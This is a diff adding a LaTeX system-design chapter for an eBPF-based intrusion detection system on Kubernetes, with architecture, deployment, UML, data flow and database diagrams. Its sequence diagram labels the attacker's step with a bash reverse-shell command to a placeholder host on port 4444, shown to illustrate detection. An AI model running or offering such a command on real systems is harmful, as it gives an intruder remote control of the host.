@@ -1,0 +1,324 @@
+\chapter{System Design}
+
+System design describes the structure of the system, the interaction between its
+components and the movement of data between them. This chapter presents the overall
+architecture, the Kubernetes deployment, UML diagrams (use case, class and sequence),
+data flow diagrams and the database design.
+
+\section{System Architecture}
+
+Figure~\ref{fig:architecture} shows the architecture. Each Kubernetes node runs one
+privileged \textbf{agent} pod (DaemonSet) that contains the eBPF sensor and the Python
+detection pipeline. The agent sends events, alerts, heartbeats and evaluation reports
+to the \textbf{FastAPI backend}, which stores them in \textbf{MongoDB}. The \textbf{React
+dashboard} reads them through the backend's REST API. All IDS components run in the
+dedicated namespace \texttt{ebpf-ids}.
+
+\begin{figure}[H]
+\centering
+\resizebox{\textwidth}{!}{%
+\begin{tikzpicture}[node distance=0.5cm and 0.6cm]
+  % node
+  \node[box, minimum width=2.4cm, fill=gray!8] (p1) {Pod\\ \scriptsize shop-web};
+  \node[box, minimum width=2.4cm, fill=gray!8, below=0.3cm of p1] (p2) {Pod\\ \scriptsize coredns, ...};
+  \node[kbox, minimum width=2.6cm, right=1.6cm of $(p1)!0.5!(p2)$] (kern) {Linux kernel\\ \scriptsize 16 tracepoints\\ \scriptsize eBPF program};
+  \node[ubox, minimum width=3.0cm, right=0.9cm of kern] (agent) {ids-agent\\ \scriptsize loader + Python\\ \scriptsize enrich, features,\\ \scriptsize RF + rules};
+  \begin{scope}[on background layer]
+    \node[draw, rounded corners, dashed, fill=gray!3, fit=(p1)(p2)(kern)(agent), inner sep=8pt,
+          label={[font=\small\bfseries]above:Kubernetes node (minikube)}] (node) {};
+  \end{scope}
+  \draw[arr] (p1.east) -- (kern.west);
+  \draw[arr] (p2.east) -- node[lbl, below, pos=0.4]{syscalls} (kern.west);
+  \draw[arr] (kern) -- node[lbl, above]{ring buf} (agent);
+
+  % control plane
+  \node[box, fill=gray!8, above=1.3cm of agent] (api) {Kubernetes API\\ \scriptsize Pod metadata};
+  \draw[darr] (api) -- node[lbl, right]{pods (RBAC)} (agent);
+
+  % backend
+  \node[dbox, minimum width=2.8cm, right=2.4cm of agent] (be) {FastAPI backend\\ \scriptsize ingest, REST API\\ \scriptsize JWT, agent token};
+  \node[db, below=1.0cm of be] (mongo) {MongoDB\\ \scriptsize events, alerts,\\ \scriptsize metrics, users};
+  \node[dbox, minimum width=2.8cm, above=1.0cm of be] (fe) {React dashboard\\ \scriptsize nginx, NodePort\\ \scriptsize 30080};
+  \node[box, fill=gray!8, right=1.4cm of fe] (user) {Security\\ admin};
+
+  \draw[arr] (agent) -- node[lbl, above]{HTTPS/JSON} node[lbl, below]{events, alerts} (be);
+  \draw[arr, <->] (be) -- (mongo);
+  \draw[arr, <->] (fe) -- node[lbl, right]{/api} (be);
+  \draw[arr, <->] (user) -- node[lbl, above]{browser} (fe);
+  \begin{scope}[on background layer]
+    \node[draw, rounded corners, dotted, fill=green!2, fit=(be)(mongo)(fe), inner sep=7pt,
+          label={[font=\scriptsize\itshape]below:namespace ebpf-ids}] {};
+  \end{scope}
+\end{tikzpicture}}
+\caption{System architecture}
+\label{fig:architecture}
+\end{figure}
+
+\section{Deployment Design}
+
+The system is deployed with plain Kubernetes manifests (\texttt{infra/k8s/}) and one
+script (\texttt{scripts/deploy\_minikube.sh}). Table~\ref{tab:k8sobjects} lists the
+Kubernetes objects. The agent needs \texttt{hostPID} and \texttt{privileged} mode to load
+eBPF programs and read every process on the node; it is limited by resource requests
+(50m CPU, 192 MiB) and limits (1 CPU, 512 MiB), and its service account can only
+\emph{get, list} and \emph{watch} pods. Credentials (MongoDB password, JWT secret, agent
+token, admin password) are generated randomly at deployment time and stored in the
+Kubernetes Secret \texttt{ids-secrets}.
+
+\begin{table}[H]
+\centering
+\caption{Kubernetes objects of the deployment}
+\label{tab:k8sobjects}
+\small
+\begin{tabularx}{\textwidth}{>{\raggedright\arraybackslash}p{4.4cm} l >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Object} & \textbf{Name} & \textbf{Purpose} \\
+\midrule
+Namespace & ebpf-ids & Isolates all IDS components \\
+DaemonSet & ids-agent & One eBPF sensor + detector per node \\
+ServiceAccount, ClusterRole, Binding & ids-agent & Read-only access to pods \\
+Deployment + Service & ids-backend & FastAPI REST API (port 8000) \\
+Deployment + Service & ids-frontend & React dashboard (NodePort 30080) \\
+Deployment + Service + PVC & ids-mongodb & MongoDB 7.0 with persistent volume \\
+Secret & ids-secrets & Random credentials and tokens \\
+Deployment (test) & ids-demo/shop-web & Victim workload for evaluation \\
+\bottomrule
+\end{tabularx}
+\end{table}
+
+\section{UML Diagrams}
+
+\subsection{Use Case Diagram}
+
+Figure~\ref{fig:usecase} shows the actors and use cases. The \emph{security
+administrator} uses the dashboard and the evaluation script. The \emph{eBPF agent} is a
+system actor that monitors workloads and reports to the backend. A \emph{workload
+process} (possibly controlled by an attacker) triggers kernel events without knowing it
+is observed.
+
+\begin{figure}[H]
+\centering
+\resizebox{0.95\textwidth}{!}{%
+\begin{tikzpicture}[uc/.style={draw, ellipse, align=center, font=\small, minimum width=3.6cm, minimum height=0.8cm, fill=blue!4},
+                    actor/.style={align=center, font=\small}]
+  \newcommand{\stick}[2]{%
+    \begin{scope}[shift={#1}]
+      \draw[thick] (0,0.55) circle (0.18);
+      \draw[thick] (0,0.37) -- (0,-0.15);
+      \draw[thick] (-0.3,0.2) -- (0.3,0.2);
+      \draw[thick] (0,-0.15) -- (-0.25,-0.55);
+      \draw[thick] (0,-0.15) -- (0.25,-0.55);
+      \node[actor] at (0,-0.85) {#2};
+    \end{scope}}
+  \node[draw, thick, minimum width=7.4cm, minimum height=11.2cm, label={[font=\bfseries]above:eBPF IDS}] (sys) at (0,0) {};
+  \node[uc] (u1) at (0,4.8) {Log in};
+  \node[uc] (u2) at (0,3.7) {View security overview};
+  \node[uc] (u3) at (0,2.6) {Search and filter alerts};
+  \node[uc] (u4) at (0,1.5) {Acknowledge / resolve alert};
+  \node[uc] (u5) at (0,0.4) {Browse runtime events};
+  \node[uc] (u6) at (0,-0.7) {View evaluation results};
+  \node[uc] (u7) at (0,-1.8) {Run attack simulation};
+  \node[uc] (u8) at (0,-2.9) {Capture kernel events};
+  \node[uc] (u9) at (0,-4.0) {Detect, score and report};
+  \node[uc] (u10) at (0,-5.1) {Send heartbeat metrics};
+
+  \stick{(-6.6,1.5)}{Security\\administrator}
+  \stick{(6.6,-4.0)}{eBPF agent\\(system)}
+  \stick{(6.6,1.5)}{Workload\\process /\\attacker}
+
+  \foreach \u in {u1,u2,u3,u4,u5,u6,u7} \draw (-6.2,1.5) -- (\u.west);
+  \foreach \u in {u8,u9,u10} \draw (6.2,-4.0) -- (\u.east);
+  \draw[dashed] (6.2,1.5) -- node[lbl, sloped, above, pos=0.35]{triggers} (u8.east);
+  \draw[darr] (u3.south) to[bend left=35] node[lbl, right]{\scriptsize $\ll$extend$\gg$} (u4.north);
+\end{tikzpicture}}
+\caption{Use case diagram}
+\label{fig:usecase}
+\end{figure}
+
+\subsection{Class Diagram}
+
+Figure~\ref{fig:class} shows the main classes of the agent and the documents stored by
+the backend. The \texttt{Agent} orchestrates a \texttt{Collector} (reads the loader's
+JSON stream), a \texttt{K8sEnricher} (with \texttt{CgroupResolver} and
+\texttt{KubeClient}), a \texttt{BehaviorTracker}, the \texttt{Detector} (Random Forest
+and rules), a \texttt{Shipper} (batched HTTP delivery) and \texttt{Metrics} (CPU, memory,
+latency, drops).
+
+\begin{figure}[H]
+\centering
+\resizebox{\textwidth}{!}{%
+\begin{tikzpicture}[cls/.style={draw, rectangle split, rectangle split parts=3, align=left,
+                    font=\scriptsize\ttfamily, fill=yellow!6, inner sep=3pt, text width=3.6cm},
+                    node distance=0.7cm and 0.7cm]
+  \node[cls] (agent) {\textbf{Agent}
+    \nodepart{second} collector, enricher\\ tracker, detector\\ shipper, metrics
+    \nodepart{third} process(batch)\\ run(), stop()};
+  \node[cls, above left=0.6cm and 0.9cm of agent] (col) {\textbf{Collector}
+    \nodepart{second} loader\_path\\ queue
+    \nodepart{third} start(), stop()\\ drain(max, timeout)};
+  \node[cls, above right=0.6cm and 0.9cm of agent] (enr) {\textbf{K8sEnricher}
+    \nodepart{second} node, cgroups\\ kube, refresh
+    \nodepart{third} refresh\_pods()\\ enrich(ev)};
+  \node[cls, right=0.7cm of enr] (cg) {\textbf{CgroupResolver}
+    \nodepart{second} root, proc\_root\\ paths
+    \nodepart{third} resolve(cgroup\_id)};
+  \node[cls, below=0.6cm of cg] (kc) {\textbf{KubeClient}
+    \nodepart{second} base, session\\ enabled
+    \nodepart{third} list\_pods(node)};
+  \node[cls, left=0.9cm of agent] (bt) {\textbf{BehaviorTracker}
+    \nodepart{second} window = 60 s\\ recent, baseline
+    \nodepart{third} observe(key, wl, ev)\\ gc()};
+  \node[cls, below left=0.8cm and -0.4cm of agent] (det) {\textbf{Detector}
+    \nodepart{second} model: RandomForest\\ classes, threshold
+    \nodepart{third} predict(X)\\ assess(ev, k8s, f, p, c)};
+  \node[cls, below right=0.8cm and -0.4cm of agent] (sh) {\textbf{Shipper}
+    \nodepart{second} base, node\\ session, failures
+    \nodepart{third} enqueue(events, alerts)\\ post(path, payload)};
+  \node[cls, below=0.6cm of det] (rule) {\textbf{Rule}
+    \nodepart{second} id, name, severity\\ category, mitre
+    \nodepart{third} test(ev, feats): bool};
+  \node[cls, right=0.7cm of sh] (met) {\textbf{Metrics}
+    \nodepart{second} processed, scored\\ raw, alerts
+    \nodepart{third} record\_batch()\\ snapshot(pids)};
+  \node[cls, below=0.6cm of sh, fill=green!6] (alert) {\textbf{Alert} (MongoDB)
+    \nodepart{second} dedup\_key, severity\\ risk\_score, mitre\\ k8s, count, status
+    \nodepart{third} acknowledge()\\ resolve()};
+  \node[cls, right=0.7cm of alert, fill=green!6] (event) {\textbf{Event} (MongoDB)
+    \nodepart{second} ts, event\_type\\ process, k8s\\ prediction
+    \nodepart{third} (TTL 24 h)};
+
+  \draw[-{Diamond[open]}, thick] (col) -- (agent);
+  \draw[-{Diamond[open]}, thick] (enr) -- (agent);
+  \draw[-{Diamond[open]}, thick] (bt) -- (agent);
+  \draw[-{Diamond[open]}, thick] (det) -- (agent);
+  \draw[-{Diamond[open]}, thick] (sh) -- (agent);
+  \draw[-{Diamond[open]}, thick] (met.north) |- ($(agent.east)+(0,-0.6)$);
+  \draw[-{Diamond[open]}, thick] (cg) -- (enr);
+  \draw[-{Diamond[open]}, thick] (kc.west) -| ($(enr.south)+(0.8,0)$);
+  \draw[thick] (det) -- node[lbl, right]{1..19} (rule);
+  \draw[darr] (sh) -- node[lbl, right]{creates} (alert);
+  \draw[darr] (sh.east) -| node[lbl, near end, right]{creates} (event.north);
+\end{tikzpicture}}
+\caption{Class diagram of the agent and stored documents}
+\label{fig:class}
+\end{figure}
+
+\subsection{Sequence Diagram}
+
+Figure~\ref{fig:sequence} shows the sequence of interactions when an attacker opens a
+reverse shell inside a pod and the administrator investigates the alert.
+
+\begin{figure}[H]
+\centering
+\resizebox{\textwidth}{!}{%
+\begin{tikzpicture}[ll/.style={draw, fill=blue!6, font=\small, minimum width=2.1cm, minimum height=0.7cm, align=center},
+                    msg/.style={-{Stealth[length=2mm]}, thick},
+                    ret/.style={-{Stealth[length=2mm]}, dashed},
+                    m/.style={font=\scriptsize, above}]
+  \def\H{-11.6}
+  \foreach \x/\n/\t in {0/a/Attacker\\(in pod), 2.7/k/Kernel +\\eBPF, 5.4/g/Agent, 8.1/b/Backend, 10.8/d/MongoDB, 13.5/u/Dashboard\\+ Admin} {
+    \node[ll] (\n) at (\x,0) {\t};
+    \draw[dashed, gray] (\x,-0.5) -- (\x,\H);
+  }
+  \draw[msg] (0,-1.35) -- node[m, font=\tiny]{bash -i \textgreater\& /dev/tcp/ip/4444} (2.7,-1.35);
+  \draw[msg] (2.7,-1.95) -- node[m]{exec + connect events} (5.4,-1.95);
+  \draw[msg] (5.4,-2.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{enrich (cgroup $\rightarrow$ Pod)} ++(0,-0.5) -- ++(-0.6,0);
+  \draw[msg] (5.4,-3.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{features + window} ++(0,-0.5) -- ++(-0.6,0);
+  \draw[msg] (5.4,-4.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{RF: P(mal)=0.98; rules R001, R002} ++(0,-0.5) -- ++(-0.6,0);
+  \draw[msg] (5.4,-5.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{risk 95 $\rightarrow$ High, T1059.004} ++(0,-0.5) -- ++(-0.6,0);
+  \draw[msg] (5.4,-6.6) -- node[m]{POST /api/ingest} (8.1,-6.6);
+  \draw[msg] (8.1,-7.2) -- node[m]{insert events; upsert alert} (10.8,-7.2);
+  \draw[ret] (10.8,-7.8) -- node[m]{ok} (8.1,-7.8);
+  \draw[ret] (8.1,-8.3) -- node[m]{200 OK} (5.4,-8.3);
+  \draw[msg] (13.5,-9.0) -- node[m]{GET /api/alerts (JWT)} (8.1,-9.0);
+  \draw[msg] (8.1,-9.5) -- node[m]{query alerts} (10.8,-9.5);
+  \draw[ret] (10.8,-10.0) -- node[m]{documents} (8.1,-10.0);
+  \draw[ret] (8.1,-10.5) -- node[m]{alert list} (13.5,-10.5);
+  \draw[msg] (13.5,-11.2) -- node[m]{PATCH status = resolved} (8.1,-11.2);
+\end{tikzpicture}}
+\caption{Sequence diagram: detection of a reverse shell}
+\label{fig:sequence}
+\end{figure}
+
+\section{Data Flow Diagrams}
+
+\subsection{Level 0 (Context Diagram)}
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[ext/.style={draw, rectangle, font=\small, align=center, minimum width=2.6cm, minimum height=1cm, fill=gray!8},
+                    proc/.style={draw, circle, font=\small, align=center, minimum size=2.9cm, fill=blue!6}]
+  \node[proc] (p) at (0,0) {0.0\\ eBPF IDS};
+  \node[ext] (w) at (-5,1.2) {Kubernetes\\ workloads};
+  \node[ext] (k) at (-5,-1.2) {Kubernetes\\ API};
+  \node[ext] (a) at (5,0) {Security\\ administrator};
+  \draw[arr] (w) -- node[lbl, sloped, above]{kernel events} (p);
+  \draw[arr] (k) -- node[lbl, sloped, below]{Pod metadata} (p);
+  \draw[arr] ([yshift=0.3cm]p.east) -- node[lbl, above]{alerts, events, metrics} ([yshift=0.3cm]a.west);
+  \draw[arr] ([yshift=-0.3cm]a.west) -- node[lbl, below]{login, filters, status} ([yshift=-0.3cm]p.east);
+\end{tikzpicture}
+\caption{Data flow diagram -- level 0}
+\label{fig:dfd0}
+\end{figure}
+
+\subsection{Level 1}
+
+\begin{figure}[H]
+\centering
+\resizebox{\textwidth}{!}{%
+\begin{tikzpicture}[proc/.style={draw, circle, font=\scriptsize, align=center, minimum size=2.0cm, fill=blue!6},
+                    store/.style={draw, font=\scriptsize, minimum width=2.4cm, minimum height=0.6cm, path picture={\draw (path picture bounding box.north west) -- (path picture bounding box.south west);}},
+                    ext/.style={draw, rectangle, font=\scriptsize, align=center, minimum width=2.0cm, minimum height=0.9cm, fill=gray!8}]
+  \node[ext] (w) at (0,0) {Workloads};
+  \node[proc] (p1) at (3,0) {1.0\\ Capture\\ events};
+  \node[proc] (p2) at (6,0) {2.0\\ Enrich\\ context};
+  \node[proc] (p3) at (9,0) {3.0\\ Extract\\ features};
+  \node[proc] (p4) at (12,0) {4.0\\ Detect \&\\ score};
+  \node[proc] (p5) at (12,-3.4) {5.0\\ Store \&\\ de-duplicate};
+  \node[proc] (p6) at (6,-3.4) {6.0\\ Serve API\\ \& dashboard};
+  \node[ext] (k8s) at (6,2.4) {Kubernetes API};
+  \node[store] (model) at (12,2.4) {D1 Model + rules};
+  \node[store] (db) at (9,-5.4) {D2 MongoDB};
+  \node[ext] (adm) at (2,-3.4) {Administrator};
+
+  \draw[arr] (w) -- node[lbl, above]{syscalls} (p1);
+  \draw[arr] (p1) -- node[lbl, above]{raw event} (p2);
+  \draw[arr] (k8s) -- node[lbl, right]{pods} (p2);
+  \draw[arr] (p2) -- node[lbl, above]{event+k8s} (p3);
+  \draw[arr] (p3) -- node[lbl, above]{74 features} (p4);
+  \draw[arr] (model) -- (p4);
+  \draw[arr] (p4) -- node[lbl, right]{events, alerts} (p5);
+  \draw[arr] (p5) |- (db);
+  \draw[arr] (db) -| (p6);
+  \draw[arr] ([yshift=0.25cm]p6.west) -- node[lbl, above]{views} ([yshift=0.25cm]adm.east);
+  \draw[arr] ([yshift=-0.25cm]adm.east) -- node[lbl, below]{queries, status} ([yshift=-0.25cm]p6.west);
+  \draw[arr] (p2.south) to[bend right=20] node[lbl, left]{raw (no pod)} (p5.west);
+\end{tikzpicture}}
+\caption{Data flow diagram -- level 1}
+\label{fig:dfd1}
+\end{figure}
+
+\section{Database Design}
+
+MongoDB stores five collections in the database \texttt{ebpf\_ids}
+(Table~\ref{tab:collections}). Time-to-live (TTL) indexes delete old documents
+automatically, and compound indexes support the dashboard's filters by namespace,
+verdict, event type and severity.
+
+\begin{table}[H]
+\centering
+\caption{MongoDB collections}
+\label{tab:collections}
+\small
+\begin{tabularx}{\textwidth}{l >{\raggedright\arraybackslash}X >{\raggedright\arraybackslash}p{3.6cm}}
+\toprule
+\textbf{Collection} & \textbf{Main fields} & \textbf{Indexes} \\
+\midrule
+events & ts, event\_type, process (comm, parent, path, cmdline, uid), network (daddr, dport), k8s (namespace, pod, container, workload, node), prediction (label, probability, category) & TTL 24 h; namespace+ts; label+ts; type+ts \\
+alerts & dedup\_key, title, category, severity, risk\_score, probability, rules, mitre, tactic, k8s, last\_event, count, status, first\_seen, last\_seen & TTL 30 days; dedup\_key+status; severity; namespace \\
+metrics & node, cpu\_percent, rss\_mb, events\_per\_sec, latency avg / p95, kernel drops, ts & TTL 24 h; node+ts \\
+evaluations & kind (offline / live), model\_version, report & -- \\
+users & username, role, password\_hash (bcrypt) & unique username \\
+\bottomrule
+\end{tabularx}
+\end{table}
